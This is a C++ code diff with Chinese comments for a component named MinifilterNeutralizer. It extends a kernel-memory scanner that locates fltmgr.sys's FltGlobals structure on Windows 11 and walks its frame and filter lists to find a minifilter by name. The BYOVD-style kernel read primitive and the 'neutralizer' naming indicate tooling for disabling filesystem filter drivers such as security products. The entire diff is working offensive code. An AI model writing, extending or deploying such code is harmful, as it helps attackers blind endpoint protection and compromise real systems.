@@ -3006,12 +3006,12 @@ static uint64_t FindRet0Stub(uint64_t fltmgrBase, uint64_t fltmgrSize) {
 // BUILD 467: Win11 兼容 — 新增 MOV RXX, imm64 (绝对地址) 模式
 // 旧模式: LEA/MOV RXX, [RIP+rel32] (RIP-relative)
 // 新模式: MOV RXX, imm64      (Win11 用绝对地址编码全局变量引用)
-// 分块读取 8192 字节
+// ★ BUILD 475: 扩展扫描范围到 16KB + 新增 MOV [abs] 模式
 static uint64_t ScanFuncForFltGlobals(uint64_t fltmgrBase, uint64_t targetFunc) {
     auto& kma = KernelMemoryAccessor::Instance();
     uint8_t buf[512] = {};
 
-    for (int chunk = 0; chunk < 16; chunk++) {
+    for (int chunk = 0; chunk < 32; chunk++) {
         if (!kma.ReadKernelVA(targetFunc + chunk * 512, buf, sizeof(buf)))
             break;
 
@@ -3034,13 +3034,233 @@ static uint64_t ScanFuncForFltGlobals(uint64_t fltmgrBase, uint64_t targetFunc) 
                     return absAddr;
                 }
             }
+            // BUILD 475 模式3: MOV RAX, [absolute_address]
+            //   48 A1 + 8字节绝对地址 (MOV RAX, moffs64)
+            //   VS2022 在 Win11 上有时会生成此模式访问 .data 段
+            else if (buf[i] == 0x48 && buf[i+1] == 0xA1 && i <= 491) {
+                uint64_t absAddr = *(uint64_t*)(buf + i + 2);
+                if (absAddr > fltmgrBase + 0x2000 && absAddr < fltmgrBase + 0x200000) {
+                    return absAddr;
+                }
+            }
+            // BUILD 475 模式4: MOV RAX, [RBX + imm32] — Win11 SIB 变体
+            //   48 8B 83 XX XX XX XX — 通过寄存器基址访问 .data 段
+            //   但需要验证计算后的地址是否在 .data 范围 — 此处跳过 (运行时依赖寄存器)
         }
     }
     return 0;
 }
 
+// ============================================================
+// ★ BUILD 475: Win11 兼容 — 直接扫描 fltmgr .data 段找 FltGlobals
+//
+// 原理 (不依赖编译器指令编码):
+//   FLT_GLOBALS 是一个巨大的全局结构体，位于 fltmgr.sys 的 .data 段
+//   其第一个字段 FrameList 是一个 LIST_ENTRY (双向链表头):
+//     +0x00: FrameList.Flink → 第一个 FLTP_FRAME
+//     +0x08: FrameList.Blink → 最后一个 FLTP_FRAME
+//
+//   LIST_ENTRY 双向链表头的关键特征:
+//     Flink->Blink == &head  (前一个节点的 Blink 指向链表头)
+//
+// 扫描策略:
+//   1. 遍历 fltmgr .data 段, 找所有 16 字节对齐的 LIST_ENTRY
+//   2. 每个候选: Flink/Blink 必须是内核地址且在 fltmgr 模块范围内
+//   3. 验证回指: *(Flink + 8) 必须等于候选地址 (Flink->Blink == &head)
+//   4. 交叉引用: 候选地址被至少 1 个已知 fltmgr 函数引用
+// ============================================================
+static uint64_t ScanDataSectionForFltGlobals(uint64_t fltmgrBase) {
+    auto& kma = KernelMemoryAccessor::Instance();
+    ByovdDiag("FLT:NTRL: === .data section scan for FltGlobals (BUILD 475) ===\n");
+
+    // 解析 PE 头获取 .data 段范围
+    IMAGE_DOS_HEADER dos = {};
+    if (!kma.ReadKernelVA(fltmgrBase, &dos, sizeof(dos))) return 0;
+    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;
+
+    uint64_t ntHdrVA = fltmgrBase + dos.e_lfanew;
+    IMAGE_NT_HEADERS64 nt = {};
+    if (!kma.ReadKernelVA(ntHdrVA, &nt, sizeof(nt))) return 0;
+    if (nt.Signature != IMAGE_NT_SIGNATURE) return 0;
+
+    uint64_t imageSize = nt.OptionalHeader.SizeOfImage;
+    WORD numSections = nt.FileHeader.NumberOfSections;
+
+    // 读段表 — VirtualAlloc 代替 std::vector
+    DWORD secTableSize = numSections * sizeof(IMAGE_SECTION_HEADER);
+    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)VirtualAlloc(
+        nullptr, secTableSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!sections) {
+        ByovdDiag("FLT:NTRL: .data scan - VirtualAlloc for sections failed\n");
+        return 0;
+    }
+
+    uint64_t secTableVA = ntHdrVA + sizeof(IMAGE_NT_HEADERS64);
+    if (!kma.ReadKernelVA(secTableVA, sections, secTableSize)) {
+        VirtualFree(sections, 0, MEM_RELEASE);
+        return 0;
+    }
+
+    // 找 .data 段 (或最大的 RW 段)
+    uint64_t dataStart = 0, dataEnd = 0;
+    for (WORD i = 0; i < numSections; i++) {
+        // .data 段特征: 可读写, 名称包含 "data" 或 ".data"
+        bool isData = (sections[i].Characteristics & IMAGE_SCN_MEM_READ) &&
+                       (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE) &&
+                       !(sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE);
+        if (isData) {
+            uint64_t secVA = fltmgrBase + sections[i].VirtualAddress;
+            uint64_t secEnd = secVA + sections[i].Misc.VirtualSize;
+            // 取最大的 RW 段 (通常是 .data)
+            if ((secEnd - secVA) > (dataEnd - dataStart)) {
+                dataStart = secVA;
+                dataEnd = secEnd;
+            }
+        }
+    }
+    VirtualFree(sections, 0, MEM_RELEASE);
+
+    if (!dataStart || !dataEnd || dataEnd <= dataStart) {
+        // 无法解析段 → 回退到估算范围
+        dataStart = fltmgrBase + 0x2000;
+        dataEnd   = fltmgrBase + (imageSize < 0x200000 ? imageSize : 0x200000);
+        ByovdDiag("FLT:NTRL: .data scan - section parse failed, using estimated range +0x%llX..+0x%llX\n",
+            dataStart - fltmgrBase, dataEnd - fltmgrBase);
+    } else {
+        ByovdDiag("FLT:NTRL: .data scan - parsed .data at +0x%llX..+0x%llX (%llu KB)\n",
+            dataStart - fltmgrBase, dataEnd - fltmgrBase, (dataEnd - dataStart) / 1024);
+    }
+
+    // 分块扫描 .data 段 — VirtualAlloc 代替 std::vector
+    uint8_t* chunk = (uint8_t*)VirtualAlloc(nullptr, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!chunk) {
+        ByovdDiag("FLT:NTRL: .data scan - VirtualAlloc for chunk failed\n");
+        return 0;
+    }
+
+    // ★ 候选数组 (固定大小, 最大 64 个, 避免 std::vector CRT 依赖)
+    struct Candidate { uint64_t addr; int refCount; };
+    Candidate candidates[64] = {};
+    int candidateCount = 0;
+
+    for (uint64_t addr = dataStart; addr < dataEnd; addr += 0x10000) {
+        uint64_t chunkEnd = (addr + 0x10000 < dataEnd) ? addr + 0x10000 : dataEnd;
+        uint64_t chunkSize = chunkEnd - addr;
+        if (!kma.ReadKernelVA(addr, chunk, chunkSize))
+            continue;
+
+        for (size_t off = 0; off + 16 <= chunkSize; off += 8) {
+            uint64_t flink = *(uint64_t*)(chunk + off);
+            uint64_t blink = *(uint64_t*)(chunk + off + 8);
+
+            // 基本验证: 两个指针都是内核地址
+            if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL)
+                continue;
+
+            // ★ 关键: Flink/Blink 必须在 fltmgr 模块范围 (FLTP_FRAME 在 fltmgr 内)
+            if (flink < fltmgrBase || flink >= fltmgrBase + imageSize)
+                continue;
+            if (blink < fltmgrBase || blink >= fltmgrBase + imageSize)
+                continue;
+
+            // ★ 验证回指: Flink->Blink 应指向此 LIST_ENTRY 头
+            uint64_t flinkBlink = 0;
+            if (!kma.ReadKernelVA(flink + 8, &flinkBlink, 8))
+                continue;
+            if (flinkBlink != addr + off)
+                continue;  // 不回指 → 不是双向链表头, 只是中间节点
+
+            // 候选地址 = addr + off (FltGlobals 地址)
+            uint64_t cand = addr + off;
+            ByovdDiag("FLT:NTRL: .data scan candidate at fltmgr+0x%llX (Flink=+0x%llX Blink=+0x%llX ✓back-ref)\n",
+                cand - fltmgrBase, flink - fltmgrBase, blink - fltmgrBase);
+            if (candidateCount < 64) {
+                candidates[candidateCount].addr = cand;
+                candidates[candidateCount].refCount = 0;
+                candidateCount++;
+            }
+        }
+    }
+
+    VirtualFree(chunk, 0, MEM_RELEASE);
+    chunk = nullptr;
+
+    if (candidateCount == 0) {
+        ByovdDiag("FLT:NTRL: .data scan - no LIST_ENTRY head candidates found\n");
+        return 0;
+    }
+
+    // ★ 交叉引用验证: 扫描已知 fltmgr 函数, 统计每个候选被引用的次数
+    //   真正的 FltGlobals 会被多个函数引用 (至少 FltRegisterFilter, FltStartFiltering 等)
+    const char* verifyExports[] = {
+        "FltRegisterFilter", "FltStartFiltering", "FltUnregisterFilter",
+        "FltGetVolumeFromName", "FltEnlistFilterForDriverInterface",
+        "FltGetFileNameInformation",
+    };
+
+    for (const char* exportName : verifyExports) {
+        uint64_t funcAddr = kma.ResolveExport(fltmgrBase, exportName);
+        if (!funcAddr) continue;
+
+        uint8_t funcBuf[1024] = {};
+        if (!kma.ReadKernelVA(funcAddr, funcBuf, sizeof(funcBuf)))
+            continue;
+
+        for (int ci = 0; ci < candidateCount; ci++) {
+            // 搜索函数体中是否引用此候选地址
+            for (int i = 0; i < 1016; i++) {
+                // LEA/MOV RIP-relative: 48/4C + 8D/8B + ModRM[RIP] + rel32
+                if ((funcBuf[i] == 0x48 || funcBuf[i] == 0x4C || funcBuf[i] == 0x4D) &&
+                    (funcBuf[i+1] == 0x8D || funcBuf[i+1] == 0x8B) &&
+                    (funcBuf[i+2] & 0xC7) == 0x05) {
+                    int32_t rel32 = *(int32_t*)(funcBuf + i + 3);
+                    if (funcAddr + i + 7 + rel32 == candidates[ci].addr) {
+                        candidates[ci].refCount++;
+                    }
+                }
+                // MOV RAX, imm64: 48 B8~BF + 8字节立即数
+                else if (funcBuf[i] == 0x48 && (funcBuf[i+1] & 0xF8) == 0xB8 && i <= 1008) {
+                    uint64_t absAddr = *(uint64_t*)(funcBuf + i + 2);
+                    if (absAddr == candidates[ci].addr) {
+                        candidates[ci].refCount++;
+                    }
+                }
+            }
+        }
+    }
+
+    // 选择被引用次数最多的候选
+    int bestIdx = -1;
+    for (int ci = 0; ci < candidateCount; ci++) {
+        ByovdDiag("FLT:NTRL: .data candidate +0x%llX refCount=%d\n",
+            candidates[ci].addr - fltmgrBase, candidates[ci].refCount);
+        if (bestIdx < 0 || candidates[ci].refCount > candidates[bestIdx].refCount) {
+            bestIdx = ci;
+        }
+    }
+
+    if (bestIdx >= 0 && candidates[bestIdx].refCount > 0) {
+        ByovdDiag("FLT:NTRL: .data scan BEST candidate at fltmgr+0x%llX (refCount=%d)\n",
+            candidates[bestIdx].addr - fltmgrBase, candidates[bestIdx].refCount);
+        return candidates[bestIdx].addr;
+    }
+
+    // ★ 最终 fallback: 如果交叉引用全部为 0, 返回第一个回指验证通过的候选
+    //   (某些 Win11 版本函数体可能很大, 1024 字节不够)
+    if (candidateCount > 0) {
+        ByovdDiag("FLT:NTRL: .data scan - no cross-ref confirmed, using first back-ref candidate at +0x%llX\n",
+            candidates[0].addr - fltmgrBase);
+        return candidates[0].addr;
+    }
+
+    ByovdDiag("FLT:NTRL: .data scan - FAILED\n");
+    return 0;
+}
+
+// ============================================================
 // BUILD 455/457: 多函数 fallback 查找 FltGlobals + MOV 变体
 // 先 LEA 后 MOV 扫描 RIP-relative 指令 → fltmgr .data 段
+// ★ BUILD 475: sigscan 失败后自动 fallback 到 .data section scan
 uint64_t MinifilterNeutralizer::FindFltGlobals(uint64_t fltmgrBase) {
     const char* exportNames[] = {
         "FltEnlistFilterForDriverInterface",  // Win10 21H2+ (主路径)
@@ -3096,6 +3316,15 @@ uint64_t MinifilterNeutralizer::FindFltGlobals(uint64_t fltmgrBase) {
         }
     }
     ByovdDiag("FLT:NTRL: FltGlobals not found via any export\n");
+
+    // ★ BUILD 475: sigscan 失败 → fallback 到 .data section 直接扫描
+    ByovdDiag("FLT:NTRL: falling back to .data section scan (BUILD 475)...\n");
+    uint64_t dataScanResult = ScanDataSectionForFltGlobals(fltmgrBase);
+    if (dataScanResult) {
+        ByovdDiag("FLT:NTRL: .data scan SUCCESS at 0x%llX\n", (unsigned long long)dataScanResult);
+        return dataScanResult;
+    }
+
     return 0;
 }
 
@@ -3104,30 +3333,33 @@ uint64_t MinifilterNeutralizer::FindFilterByName(uint64_t fltmgrBase, uint64_t f
     auto& kma = KernelMemoryAccessor::Instance();
     ByovdDiag("FLT:NTRL: finding filter '%ls'\n", name);
 
-    // BUILD 466: FltGlobals 在 Win10 版本间布局不同
-    //   不再假设 FrameList 在 +0x00 — 尝试 fltGlobals 前 4 个 qword
-    uint64_t globQw[4] = {};
-    for (int i = 0; i < 4; i++) {
+    // BUILD 466 + BUILD 475: FltGlobals 在 Win10/11 版本间布局不同
+    //   不再假设 FrameList 在 +0x00 — 尝试 fltGlobals 前 8 个 qword (Win11 可能更远)
+    uint64_t globQw[8] = {};
+    for (int i = 0; i < 8; i++) {
         kma.ReadKernelVA(fltGlobals + i * 8, &globQw[i], 8);
     }
-    ByovdDiag("FLT:NTRL: FltGlobals hex: %016llX %016llX %016llX %016llX\n",
+    ByovdDiag("FLT:NTRL: FltGlobals hex: %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX\n",
         (unsigned long long)globQw[0], (unsigned long long)globQw[1],
-        (unsigned long long)globQw[2], (unsigned long long)globQw[3]);
+        (unsigned long long)globQw[2], (unsigned long long)globQw[3],
+        (unsigned long long)globQw[4], (unsigned long long)globQw[5],
+        (unsigned long long)globQw[6], (unsigned long long)globQw[7]);
 
-    // FLTP_FRAME.FilterList 偏移
+    // FLTP_FRAME.FilterList 偏移 (BUILD 475: 扩展到 0x300)
     uint64_t filterOffsets[] = { 
         0x138, 0x140, 0x148, 0x150, 0x158, 0x160, 0x168, 0x170, 0x178, 0x180,
         0x188, 0x190, 0x198, 0x1A0, 0x1A8, 0x1B0, 0x1B8, 0x1C0, 0x1C8, 0x1D0,
         0x1D8, 0x1E0, 0x1E8, 0x1F0, 0x1F8, 0x200, 0x208, 0x210, 0x218, 0x220,
         0x228, 0x230, 0x238, 0x240, 0x248, 0x250, 0x258, 0x260, 0x268, 0x270,
         0x278, 0x280, 0x288, 0x290, 0x298, 0x2A0, 0x2A8, 0x2B0, 0x2B8, 0x2C0,
+        0x2C8, 0x2D0, 0x2D8, 0x2E0, 0x2E8, 0x2F0, 0x2F8, 0x300,
     };
 
     uint64_t filterListHead = 0;
     uint64_t frameList = 0;
 
-    // ★ BUILD 466: 尝试每个 qword 作为 FrameList 指针
-    for (int qi = 0; qi < 4 && !filterListHead; qi++) {
+    // ★ BUILD 466: 尝试每个 qword 作为 FrameList 指针 (BUILD 475: 尝试 8 个)
+    for (int qi = 0; qi < 8 && !filterListHead; qi++) {
         uint64_t candidateFrame = globQw[qi];
         if (candidateFrame < 0xFFFF800000000000ULL) continue;
 
@@ -3162,7 +3394,7 @@ uint64_t MinifilterNeutralizer::FindFilterByName(uint64_t fltmgrBase, uint64_t f
         ByovdDiag("FLT:NTRL: FilterList not found in any frame candidate\n");
 
         // 诊断: dump 每个候选的前 4 qword
-        for (int qi = 0; qi < 4; qi++) {
+        for (int qi = 0; qi < 8; qi++) {
             uint64_t cf = globQw[qi];
             if (cf < 0xFFFF800000000000ULL) continue;
             ByovdDiag("FLT:NTRL: frame[%d] hex: ", qi);
